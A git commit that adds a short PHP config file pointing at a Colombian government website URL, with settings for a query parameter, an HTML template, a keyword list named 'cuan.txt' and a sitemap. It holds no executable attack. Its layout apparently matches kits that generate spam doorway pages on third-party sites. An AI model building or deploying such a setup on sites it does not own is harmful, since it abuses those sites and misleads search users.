0251c29b3f61330bcfc757e3a0c4ea4127ade0b5
sztsss <satriatio354@gmail.com>
2025-05-28 19:30:43 +0700

    Create config.php

---
+++ config.php
@@ -0,0 +1,9 @@
+<?php
+$config = array(
+  	'url'		=> 'https://esecarisma.gov.co/esecarisma/',
+	'parameter' => 'proyek',
+	'template'  => 'temp16.html',
+	'keywords'  => 'cuan.txt',
+	'sitemap'	=> 'sitemap.xml'
+);
+?>
